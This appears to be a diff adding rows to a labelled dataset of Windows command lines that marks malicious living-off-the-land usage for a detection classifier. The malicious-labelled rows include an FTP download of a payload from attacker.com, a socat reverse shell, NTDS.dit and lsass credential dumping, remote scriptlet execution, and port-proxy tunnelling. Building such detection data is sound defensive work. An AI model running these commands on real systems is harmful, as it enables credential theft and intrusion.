+C:\Windows\System32\net.exe localgroup Administrators ffxskuxt /add,0,combined_lotl,597
+runexehelper.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,598
+"echo %DATE% %TIME% >> ""C:\AppData\Logs\dhupvmeaq.dat""",0,combined_lotl,599
+C:\Program Files (x86)\ping.exe 10.0.0.1,0,combined_lotl,600
+"attrib.exe +h ""C:\Logs\xfalty.log""",0,combined_lotl,601
+Scriptrunner.exe -appvscript {PATH:.exe},1,combined_lotl,602
+TTTracer.exe -dumpFull -attach {PID},1,combined_lotl,603
+fsutil volume [diskfree] D:\Users\uyrc\Documents,0,combined_lotl,604
+"lbpolicy set lun type.exe=<type> [paths=C:\Windows\Program Files-{primary | <weight>}[,C:\Windows\Program Files-{primary | <weight>}[,…]]]",0,combined_lotl,605
+diskshadow.exe /s {PATH:.txt},1,combined_lotl,606
+"echo %DATE% %TIME% >> ""C:\Users\Program Files\autpcajrh.ini""",0,combined_lotl,607
+msbuild.exe {PATH:.csproj},1,combined_lotl,608
+echo.exe W5GPPuwzOhYe > C:\Windows\Program Files\boukcq.ini,0,combined_lotl,609
+"bash.exe -c ""{CMD}""",1,combined_lotl,610
+"icacls ""D:\Temp\Temp\vglvhhorb.log"" /grant Everyone:F",0,combined_lotl,611
+"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",1,combined_lotl,612
+"copy ""C:\Logs\hyturetsmv.txt"" ""D:\Program Files\kxptv.exe""",0,combined_lotl,613
+"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet",1,combined_lotl,614
+"copy.exe ""C:\Temp\Windows\sufxbe.txt"" ""C:\Temp\potcox.dat""",0,combined_lotl,615
+echo 6d5keXeUzVMc > D:\Windows\wrmptit.txt,0,combined_lotl,616
+"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",1,combined_lotl,617
+"move.exe ""C:\Program Files\mjqfgodti.ini"" ""C:\Temp\usfcwboor.dat""",0,combined_lotl,618
+"echo.exe %DATE% %TIME% >> ""C:\Program Files\Program Files\hafyphnpyx.log""",0,combined_lotl,619
+net user kzqqipvq /add,0,combined_lotl,620
+remove [{letter=E | mount=C:\Users\dvxhox\Pictures [all]}] [noerr],0,combined_lotl,621
+ping.exe 192.168.231.183,0,combined_lotl,622
+diskshadow/set/unexpose {f36d0be6-0c4e-4075-b70d-e153f1fdaa2f | D | <share> | <mountpoint>},0,combined_lotl,623
+"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",1,combined_lotl,624
+"echo %DATE% %TIME% >> ""C:\Windows\Windows\vwroiam.exe""",0,combined_lotl,625
+fsutil.exe usn deletejournal /d c:,1,combined_lotl,626
+net.exe localgroup Administrators xkxtpner /add,0,combined_lotl,627
+control.exe {PATH_ABSOLUTE}:evil.dll,1,combined_lotl,628
+Drive 2    Online      Healthy         107 GB    107 GB    0     2,0,combined_lotl,629
+InfDefaultInstall.exe {PATH:.inf},1,combined_lotl,630
+"echo.exe %DATE% %TIME% >> ""C:\Temp\Users\lokdorks.dll""",0,combined_lotl,631
+echo Mul4c0ZFvtTV > C:\Users\Temp\frmpia.ini,0,combined_lotl,632
+"echo %DATE% %TIME% >> ""D:\Temp\shnned.exe""",0,combined_lotl,633
+"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",1,combined_lotl,634
+ping.exe 192.168.117.42,0,combined_lotl,635
+"tasklist | findstr ""chrome.exe""",0,combined_lotl,636
+ping.exe 10.0.0.1,0,combined_lotl,637
+"move.exe ""D:\Program Files\AppData\ufiitfqjb.log"" ""C:\Users\sowze\Pictures\xkxsrk.ini""",0,combined_lotl,638
+delete tpgroup [noerr],0,combined_lotl,639
+"mkdir ""D:\Temp\Logs""",0,combined_lotl,640
+"icacls ""C:\Temp\caiftwvmtw.sys"" /grant Everyone:F",0,combined_lotl,641
+"copy ""C:\Windows\bxfcdtiw.exe"" ""C:\Temp\Windows\cfydx.txt""",0,combined_lotl,642
+"echo %DATE% %TIME% >> ""C:\AppData\Temp\rjllsz.sys""",0,combined_lotl,643
+ping.exe 192.168.68.221,0,combined_lotl,644
+"dir.exe ""C:\Users\jynrpwfr\Documents""",0,combined_lotl,645
+xbootmgrsleep.exe 1000 {PATH:.exe},1,combined_lotl,646
+"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",1,combined_lotl,647
+"findstr /C:""zvMehBymBG1V"" ""C:\Windows\spwqdzmxrk.sys""",0,combined_lotl,648
+net.exe use Z: \\192.168.200.26\backup,0,combined_lotl,649
+rasautou -d {PATH:.dll} -p export_name -a a -e e,1,combined_lotl,650
+"move ""D:\Windows\Logs\tzqxligo.ini"" ""D:\Temp\Windows\ixstkwujl.log""",0,combined_lotl,651
+"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",1,combined_lotl,652
+"move ""C:\Temp\Windows\molhgxrx.exe"" ""C:\Windows\yfekejrkdj.dll""",0,combined_lotl,653
+echo.exe UzIElejeED1l > D:\Users\lddjqk\Desktop\Desktop\cfudj.txt,0,combined_lotl,654
+mmc.exe gpedit.msc,1,combined_lotl,655
+"wmic process call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""",1,combined_lotl,656
+"powershell.exe -Command ""Get-ChildItem -Path D:\Temp\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,657
+"dir.exe ""C:\Windows\Temp""",0,combined_lotl,658
+"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Users\lzcqeavr\Pictures -Recurse | Select-Object FullName, Length""",0,combined_lotl,659
+"attrib +h ""C:\Program Files\Logs\elxucx.exe""",0,combined_lotl,660
+msbuild.exe @{PATH:.rsp},1,combined_lotl,661
+"wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\",1,volttyphoon,662
+net.exe localgroup Administrators jtqulgpo /add,0,combined_lotl,663
+"rundll32 advpack.dll, RegisterOCX {cmd.exe}",1,combined_lotl,664
+"del ""C:\Logs\didptik.txt"" /f /q",0,combined_lotl,665
+echo.exe EobZudARJFHY > C:\AppData\Program Files\rflmml.sys,0,combined_lotl,666
+jsc.exe {PATH:.js},1,combined_lotl,667
+"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\AppData\ksfley.ini""",0,combined_lotl,668
+"findstr.exe /C:""pWyU0uv5dbFo"" ""D:\Temp\Program Files\mhmjkqmpw.sys""",0,combined_lotl,669
+"dir ""C:\Users\bdya\Downloads""",0,combined_lotl,670
+"type.exe ""D:\Users\fdfheshx\Documents\jncdk.sys""",0,combined_lotl,671
+net use Z: \\192.168.194.164\backup,0,combined_lotl,672
+dump64.exe {PID} out.dmp,1,combined_lotl,673
+"findstr.exe /C:""RdjAjHBwbjzc"" ""C:\Program Files\Users\xhcywvmks.txt""",0,combined_lotl,674
+rem Set prompt to indicate current directory,0,combined_lotl,675
+fsutil.exe usn [enumdata] <fileref> <lowUSN> <highUSN> <volumepath>,0,combined_lotl,676
+"fsutil.exe file layout ""C:\AppData\bmclx.dat""",0,combined_lotl,677
+"certutil.exe -hashfile ""D:\Temp\apotmmz.dll"" SHA256",0,combined_lotl,678
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Windows\AppData\yegkjtpms.dll\"" \""C:\Users\slss\Documents\Documents\wpxtksgvz.exe\"""" /sc daily /st 23:00",0,combined_lotl,679
+"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",1,combined_lotl,680
+"rmdir ""C:\Logs\Program Files"" /s /q",0,combined_lotl,681
+C:\Windows\System32\net.exe localgroup Administrators dlklujwa /add,0,combined_lotl,682
+"C:\Windows\System32\findstr.exe /C:""THxlmCSC7USx"" ""C:\Users\uylrojl.txt""",0,combined_lotl,683
+net localgroup Administrators qlboxiaw /add,0,combined_lotl,684
+"dir ""C:\Program Files\Windows""",0,combined_lotl,685
+csc -target:library {PATH:.cs},1,combined_lotl,686
+"move.exe ""C:\Logs\jdetb.sys"" ""D:\Users\pirihlxu\Pictures\Desktop\fumqgkqh.log""",0,combined_lotl,687
+C:\Program Files\net.exe localgroup Administrators guest /add,0,combined_lotl,688
+"findstr /C:""BifjEWcxCuj6"" ""C:\Users\cnkzibbbe.sys""",0,combined_lotl,689
+"icacls.exe ""C:\Program Files\Temp\cwhqznx.dll"" /grant Everyone:F",0,combined_lotl,690
+eudcedit,1,combined_lotl,691
+ping.exe 192.168.189.178,0,combined_lotl,692
+net localgroup Administrators gvfehtjb /add,0,combined_lotl,693
+"mkdir.exe ""D:\Program Files\Program Files""",0,combined_lotl,694
+"echo %DATE% %TIME% >> ""D:\Program Files\lukxo.ini""",0,combined_lotl,695
+"powershell -Command ""Get-ChildItem -Path C:\Temp\Windows -Recurse | Select-Object FullName, Length""",0,combined_lotl,696
+echo.exe s7Uw1VAWtaDI > D:\Users\swpipwy\Pictures\pffyr.sys,0,combined_lotl,697
+"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""C:\Users\ggmu\Downloads\chwhf.dat\"" \""C:\Temp\tgakdpsnbd.txt\"""" /sc daily /st 23:00",0,combined_lotl,698
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\Program Files\gmaerolsq.txt\"" \""D:\Windows\rqaumjpzt.log\"""" /sc daily /st 23:00",0,combined_lotl,699
+"move.exe ""C:\Logs\vsvgrg.log"" ""C:\Program Files\aucsri.txt""",0,combined_lotl,700
+"type.exe ""D:\Users\ewkhzpas.ini""",0,combined_lotl,701
+"move ""C:\Logs\ejxrpam.ini"" ""D:\Users\fwmknivq\Pictures\Documents\lkgoufmwuz.sys""",0,combined_lotl,702
+"dir.exe ""C:\Temp\AppData"" /s /b",0,combined_lotl,703
+"copy ""D:\Users\vqltrx.dll"" ""D:\Windows\pzvcwxf.log""",0,combined_lotl,704
+net use Z: \\192.168.32.197\public,0,combined_lotl,705
+"fsutil file layout ""C:\Users\unjvs\Downloads\Downloads\hmzfaaro.exe""",0,combined_lotl,706
+"fsutil file layout ""D:\AppData\tfvta.dll""",0,combined_lotl,707
+"echo.exe %DATE% %TIME% >> ""D:\Users\AppData\qprmw.dat""",0,combined_lotl,708
+powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},1,combined_lotl,709
+te.exe {PATH:.wsc},1,combined_lotl,710
+Ldifde -i -f {PATH:.ldf},1,combined_lotl,711
+"icacls.exe ""C:\Logs\Users\qezrluwbox.dat"" /grant Everyone:F",0,combined_lotl,712
+"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1,combined_lotl,713
+tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},1,combined_lotl,714
+"dir ""C:\Windows\Temp"" /s /b",0,combined_lotl,715
+add volume <volume> [provider 99a81c7d-1469-461f-a8bd-b08434291288],0,combined_lotl,716
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml},1,combined_lotl,717
+"dir.exe ""C:\Windows\Users"" /s /b",0,combined_lotl,718
+"type.exe ""D:\Temp\Program Files\ztfpgtize.sys""",0,combined_lotl,719
+"move ""C:\Program Files\Logs\gzskharpnp.txt"" ""D:\Windows\bejbks.dat""",0,combined_lotl,720
+"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",1,combined_lotl,721
+net use Z: \\192.168.234.206\backup,0,combined_lotl,722
+net.exe user mcautzkv /add,0,combined_lotl,723
+"
+scanline.exe -t 192.168.1.0/24 -p 1-65535",1,combined_lotl,724
+DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},1,combined_lotl,725
+"C:\Windows\copy.exe ""C:\Temp\Program Files\hybyqjbgb.dat"" ""C:\Windows\Program Files\fynblesd.ini""",0,combined_lotl,726
+"echo %DATE% %TIME% >> ""C:\Temp\Windows\oabio.exe""",0,combined_lotl,727
+ping.exe 192.168.108.229,0,combined_lotl,728
+netsh.exe interface show interface,0,combined_lotl,729
+"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",1,combined_lotl,730
+"copy ""D:\Temp\qamzxbcbtm.exe"" ""C:\Program Files\rcygctjwz.dll""",0,combined_lotl,731
+"certutil.exe -hashfile ""D:\Users\Temp\jwcoqy.ini"" SHA256",0,combined_lotl,732
+ping.exe 192.168.229.195,0,combined_lotl,733
+"attrib +h ""C:\Users\zgcw\Pictures\gatgpxriuv.ini""",0,combined_lotl,734
+WinProj.exe {REMOTEURL},1,combined_lotl,735
+"C:\Windows\System32\type.exe ""D:\Logs\evluwpo.dat""",0,combined_lotl,736
+"C:\Windows\System32\attrib.exe +h ""C:\Users\nixdh.ini""",0,combined_lotl,737
+"findstr /C:""fkXyz62uAjGV"" ""D:\Windows\hcgduxu.txt""",0,combined_lotl,738
+"echo %DATE% %TIME% >> ""D:\AppData\qdwze.exe""",0,combined_lotl,739
+"rmdir.exe ""D:\Program Files\Program Files"" /s /q",0,combined_lotl,740
+"E:\Windows\echo.exe %DATE% %TIME% >> ""C:\Users\zxstx\Downloads\Documents\wcuwprkwuj.dat""",0,combined_lotl,741
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\riigoizp.exe\"" \""C:\Users\uquha.dat\"""" /sc daily /st 23:00",0,combined_lotl,742
+"icacls ""D:\Logs\Program Files\xzgusgchor.ini"" /grant Everyone:F",0,combined_lotl,743
+"del ""C:\Users\nnayscuv\Documents\wuqvvr.dll"" /f /q",0,combined_lotl,744
+"fsutil file layout ""C:\AppData\cuzyqixanz.exe""",0,combined_lotl,745
+cmd.exe /c netsh.exe interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=,1,volttyphoon,746
+"icacls.exe ""D:\Users\Program Files\drsanpdd.dll"" /grant Everyone:F",0,combined_lotl,747
+ping.exe 192.168.105.49,0,combined_lotl,748
+"eventcreate.exe /s server /u user /id 100 /t WARNING /d ""Remote machine with partial user credentials""",0,volttyphoon,749
+"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",1,combined_lotl,750
+"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",1,combined_lotl,751
+C:\Program Files (x86)\ping.exe 8.8.8.8,0,combined_lotl,752
+"C:\Windows\NTDS\ntds.dit' to
+'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
+opy1\Windows\NTDS\ntds.dit'",1,combined_lotl,753
+"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1,combined_lotl,754
+C:\Windows\System32\net.exe user kjaanjch /add,0,combined_lotl,755
+"findstr.exe /C:""Ygge2BaxroQo"" ""D:\Logs\yqmhsdvcd.dat""",0,combined_lotl,756
+"fsutil file layout ""C:\Users\gjml\Documents\Downloads\oqphhd.exe""",0,combined_lotl,757
+C:\Windows\System32\net.exe user cssdgpfh /add,0,combined_lotl,758
+"copy.exe ""C:\Users\hifhq\Pictures\Desktop\fghxtcbvvp.txt"" ""C:\Users\nrht\Documents\Pictures\ubvjzequ.txt""",0,combined_lotl,759
+evntcmd [/s <computername>] [/v <verbositylevel>] [/n] C:\Temp\Temp\ziealwacog.dat,0,combined_lotl,760
+"icacls ""D:\AppData\vhjtgxsc.exe"" /grant Everyone:F",0,combined_lotl,761
+"attrib.exe +h ""D:\Users\llkuu\Pictures\Desktop\qmxgbnqran.txt""",0,combined_lotl,762
+WFMFormat.exe,1,combined_lotl,763
+ping 192.168.143.145,0,combined_lotl,764
+echo BTJmZAGEQbeK > D:\Windows\kmripzuu.exe,0,combined_lotl,765
+net.exe user suabwgdy /add,0,combined_lotl,766
+mshta.exe {REMOTEURL},1,combined_lotl,767
+"echo.exe %DATE% %TIME% >> ""C:\Temp\ulwya.txt""",0,combined_lotl,768
+"move ""C:\Windows\mtiqtqm.dll"" ""C:\Program Files\Temp\cmzlu.ini""",0,combined_lotl,769
+"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",1,combined_lotl,770
+net.exe user btauvbrq /add,0,combined_lotl,771
+"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",1,combined_lotl,772
+"fsutil.exe file layout ""C:\Windows\sjpgj.sys""",0,combined_lotl,773
+"fsutil file layout ""C:\Users\fnoldpc\Downloads\ninbq.log""",0,combined_lotl,774
+"copy ""C:\Program Files\kngitbtt.sys"" ""C:\Temp\Logs\pjljvt.txt""",0,combined_lotl,775
+"del ""C:\Temp\Users\kjnpxrocw.txt"" /f /q",0,combined_lotl,776
+chap initiator remember secret=[YO7b1sdr059iAGuE] target=iqn.2025-11.com.example:pgtdyvdt,0,combined_lotl,777
+"C:\Windows\System32\icacls.exe ""D:\Users\tkrtzk\Documents\Documents\ptpjaws.dat"" /grant Everyone:F",0,combined_lotl,778
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Program Files\rsqpiivy.dll\"" \""C:\Users\Program Files\lzcktjk.dll\"""" /sc daily /st 23:00",0,combined_lotl,779
+"odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2""
+odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project""
+",1,combined_lotl,780
+echo.exe J23frTEDmDVx > D:\Temp\Users\phzxux.log,0,combined_lotl,781
+te.exe {PATH:.dll},1,combined_lotl,782
+"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PortProxy\v4tov4
+\cp\0.0.0.0/49275 | {redacted IP address}/8443.",1,combined_lotl,783
+"C:\Windows\System32\dir.exe ""C:\Users\Logs""",0,combined_lotl,784
+"echo.exe %DATE% %TIME% >> ""C:\Program Files\fkaowzrp.txt""",0,combined_lotl,785
+dnx.exe {PATH_ABSOLUTE:folder},1,combined_lotl,786
+"del ""C:\Temp\Logs\bzyqgs.ini"" /f /q",0,combined_lotl,787
+"dir.exe ""D:\Temp\AppData"" /s /b",0,combined_lotl,788
+vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},1,combined_lotl,789
+Controller port associations changed.,0,combined_lotl,790
+regasm.exe {PATH:.dll},1,combined_lotl,791
+ping.exe 192.168.158.4,0,combined_lotl,792
+"C:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Temp\Program Files -Recurse | Select-Object FullName, Length""",0,combined_lotl,793
+"move.exe ""C:\Users\Users\scfyzqjn.sys"" ""D:\Logs\Program Files\wwnigyxt.ini""",0,combined_lotl,794
+CustomShellHost.exe,1,combined_lotl,795
+fsutil.exe usn [readjournal] [c= <chunk-size> s=<file-size-threshold>] D:\Program Files\Windows,0,combined_lotl,796
+"create lun stripe [size=825] [drives=<n, n> [,...]]  [stripesize=825] [noerr]",0,combined_lotl,797
+runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder},1,combined_lotl,798
+"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",1,combined_lotl,799
+"move.exe ""D:\Logs\tkqlzuwrgg.sys"" ""D:\Logs\htlcyprnu.dll""",0,combined_lotl,800
+rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,1,combined_lotl,801
+ping.exe 192.168.40.28,0,combined_lotl,802
+"certutil.exe -hashfile ""C:\Users\xzqbq.dat"" SHA256",0,combined_lotl,803
+"del ""C:\Temp\pqgjk.txt"" /f /q",0,combined_lotl,804
+"cmd.exe /Q /c wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1",1,combined_lotl,805
+"certutil.exe -hashfile ""D:\AppData\Program Files\jpgxiem.log"" SHA256",0,combined_lotl,806
+"findstr /C:""INansRMlfofF"" ""D:\Users\euwgpq\Documents\bviunlkm.sys""",0,combined_lotl,807
+"attrib +h ""D:\Program Files\zxrflukh.ini""",0,combined_lotl,808
+LUN 5 is now the selected LUN.,0,combined_lotl,809
+"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1,combined_lotl,810
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit""",1,combined_lotl,811
+sqldumper.exe 464 0 0x0110,1,combined_lotl,812
+net.exe user jebyenda /add,0,combined_lotl,813
+expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},1,combined_lotl,814
+"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path D:\Users\hwvcww\Downloads -Recurse | Select-Object FullName, Length""",0,combined_lotl,815
+"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""",1,combined_lotl,816
+C:\Windows\System32\echo.exe yatUxuVsN1iu > D:\Windows\Temp\mgwhf.dll,0,combined_lotl,817
+"type ""C:\AppData\vrudt.ini""",0,combined_lotl,818
+ping.exe 192.168.41.19,0,combined_lotl,819
+certoc.exe -GetCACAPS {REMOTEURL:.ps1},1,combined_lotl,820
+"rmdir.exe ""D:\Users\plxoj\Documents"" /s /q",0,combined_lotl,821
+"""cmd.exe /c ""netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""""",1,combined_lotl,822
+winget.exe install --accept-package-agreements -s msstore {name or ID},1,combined_lotl,823
+"certutil -hashfile ""C:\Logs\AppData\bdoeat.exe"" SHA256",0,combined_lotl,824
+"attrib.exe +h ""C:\Windows\Users\znzasrp.log""",0,combined_lotl,825
+"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",1,combined_lotl,826
+"copy ""D:\Users\Windows\degucxmmt.exe"" ""C:\Windows\envcknrhle.dll""",0,combined_lotl,827
+"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",1,combined_lotl,828
+net.exe localgroup Administrators ansitjip /add,0,combined_lotl,829
+Update.exe --update={PATH_SMB:folder},1,combined_lotl,830
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,1,combined_lotl,831
+"move.exe ""C:\Temp\AppData\ilfszf.log"" ""C:\Users\hwddcbev\Downloads\dyecszfqo.log""",0,combined_lotl,832
+ping.exe 192.168.23.170,0,combined_lotl,833
+"certutil -hashfile ""D:\Windows\Logs\xevsvulfq.exe"" SHA256",0,combined_lotl,834
+"E:\Windows\findstr.exe /C:""VL1RkxIQGtAB"" ""C:\AppData\htwjbbtl.ini""",0,combined_lotl,835
+"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""{C:\Windows\cmd.exe}""} -r:http://target:5985",1,combined_lotl,836
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit""",1,combined_lotl,837
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\Temp\tshzw.exe\"" \""C:\Program Files\Program Files\yzsdonen.txt\"""" /sc daily /st 23:00",0,combined_lotl,838
+adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,1,combined_lotl,839
+"fsutil.exe file layout ""D:\Users\ejhi\Pictures\Pictures\fbsbrvktde.dll""",0,combined_lotl,840
+"findstr.exe /C:""678jLbytikDb"" ""C:\Temp\sczjfu.sys""",0,combined_lotl,841
+C:\Program Files\ping.exe 192.168.1.1,0,combined_lotl,842
+mpiexec.exe {CMD},1,combined_lotl,843
+"copy.exe ""C:\Users\zmcgled.dat"" ""C:\Program Files\rxvkdtepsh.dll""",0,combined_lotl,844
+"fsutil file layout ""C:\Windows\Logs\mnjjegzzt.exe""",0,combined_lotl,845
+"icacls.exe ""C:\Temp\dfswjk.ini"" /grant Everyone:F",0,combined_lotl,846
+net use Z: \\192.168.76.182\public,0,combined_lotl,847
+OneDriveStandaloneUpdater,1,combined_lotl,848
+ping 192.168.109.185,0,combined_lotl,849
+"dir.exe ""C:\Users\txymbzci\Downloads\Documents""",0,combined_lotl,850
+"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\AppData\Logs\eepur.txt""",0,combined_lotl,851
+"echo %DATE% %TIME% >> ""D:\Logs\Program Files\atecky.exe""",0,combined_lotl,852
+"copy ""C:\Logs\osqektsak.exe"" ""C:\AppData\syvovvfdk.dll""",0,combined_lotl,853
+"attrib +h ""D:\Temp\AppData\ougvvzlqxd.txt""",0,combined_lotl,854
+"move.exe ""C:\Logs\Users\obhcibcic.txt"" ""D:\Users\wvufcr.dat""",0,combined_lotl,855
+conhost.exe --headless {CMD},1,combined_lotl,856
+"icacls ""D:\Logs\wmlsupmxju.ini"" /grant Everyone:F",0,combined_lotl,857
+wsreset.exe,1,combined_lotl,858
+"certutil -hashfile ""C:\Users\wzdqyex.ini"" SHA256",0,combined_lotl,859
+net.exe localgroup Administrators uifuagal /add,0,combined_lotl,860
+Update.exe --update={REMOTEURL},1,combined_lotl,861
+findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},1,combined_lotl,862
+"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",1,combined_lotl,863
+fondue.exe /enable-feature:TFTP-Client [/caller-name:<program_name>] [/hide-ux:{all | rebootrequest}],0,combined_lotl,864
+"copy.exe ""C:\Users\zqinr\Documents\Downloads\psqbhy.dat"" ""C:\Users\eorafz.ini""",0,combined_lotl,865
+net.exe user ssamggbn /add,0,combined_lotl,866
+"C:\Windows\System32\move.exe ""C:\Logs\AppData\aafnlh.log"" ""C:\Logs\bcnfwjvwhf.sys""",0,combined_lotl,867
+net.exe localgroup Administrators lbmiizbq /add,0,combined_lotl,868
+"move.exe ""C:\Users\utpdoo.log"" ""D:\Logs\ndprkzotgf.txt""",0,combined_lotl,869
+"del ""D:\Temp\ndbaztitpb.dll"" /f /q",0,combined_lotl,870
+C:\Windows\net.exe localgroup Administrators ocwtmfne /add,0,combined_lotl,871
+"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",1,combined_lotl,872
+net.exe use Z: \\192.168.42.19\backup,0,combined_lotl,873
+"powershell.exe -Command ""Get-ChildItem -Path D:\Temp\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,874
+ping.exe 192.168.165.19,0,combined_lotl,875
+net use Z: \\192.168.23.21\public,0,combined_lotl,876
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Temp\jugjprx.txt\"" \""C:\Temp\Users\ngfxfd.exe\"""" /sc daily /st 23:00",0,combined_lotl,877
+"move.exe ""C:\Windows\Logs\mrvbv.dat"" ""C:\Users\Logs\smzgtssyxt.dll""",0,combined_lotl,878
+"copy ""D:\Users\yarmqy\Desktop\izhden.dll"" ""D:\Temp\Windows\dmoafi.log""",0,combined_lotl,879
+C:\Windows\net.exe user lzvtwvpx /add,0,combined_lotl,880
+ping.exe 192.168.219.64,0,combined_lotl,881
+net.exe use Z: \\192.168.10.79\data,0,combined_lotl,882
+net use Z: \\192.168.234.185\backup,0,combined_lotl,883
+"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""{CMD}""} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",1,combined_lotl,884
+"""C:\pstools\psexec.exe"" {REDACTED} -s cmd.exe /c ""cmd.exe /c netsh.exe
+interface portproxy delete v4tov4 listenaddress=0.0.0.0
+listenport=9999",1,volttyphoon,885
+C:\Windows\net.exe localgroup Administrators cxatrtvy /add,0,combined_lotl,886
+reg.exe export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,1,combined_lotl,887
+"icacls.exe ""C:\Program Files\Logs\pdkeoivee.ini"" /grant Everyone:F",0,combined_lotl,888
+"dir.exe ""D:\Temp\Logs""",0,combined_lotl,889
+net.exe user ltnhcxig /add,0,combined_lotl,890
+"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",1,combined_lotl,891
+"move.exe ""C:\Program Files\ddjduppkff.ini"" ""D:\Program Files\xhnzwmucbn.ini""",0,combined_lotl,892
+"E:\Windows\move.exe ""C:\Windows\AppData\fopamimqzc.txt"" ""C:\Temp\abtmsdkeya.dat""",0,combined_lotl,893
+ping 192.168.217.9,0,combined_lotl,894
